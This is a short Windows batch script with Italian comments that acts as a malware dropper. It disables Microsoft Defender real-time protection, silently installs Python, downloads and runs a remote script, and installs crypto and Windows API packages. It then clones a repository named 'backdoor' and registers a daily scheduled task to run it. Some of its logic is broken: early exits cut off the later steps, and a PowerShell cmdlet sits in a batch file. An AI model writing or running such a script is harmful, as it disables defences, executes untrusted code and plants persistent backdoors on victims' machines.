@echo off

:: disabilita defender ----
Set-MpPreference -DisableRealtimeMonitoring $true


where python >nul 2>&1
if %errorlevel% equ 0 exit /b 0

curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe

python-installer.exe /quiet /passive

where python >nul 2>&1
if %errorlevel% equ 0 (
    exit /b 0
) else (
    exit /b 1
)

curl -o script.py https://raw.githubusercontent.com/user/repository/master/script.py

pip install pycryptodomex
pip install pypiwin32


python script.py


set "directory=C:\user\destinazione"
git clone https://github.com/nomeutente/backdoor.git "%directory%"

schtasks /create /tn "NomeTask" /tr "C:\user\destinazione\backdoor.bat" /sc daily /st 09:00
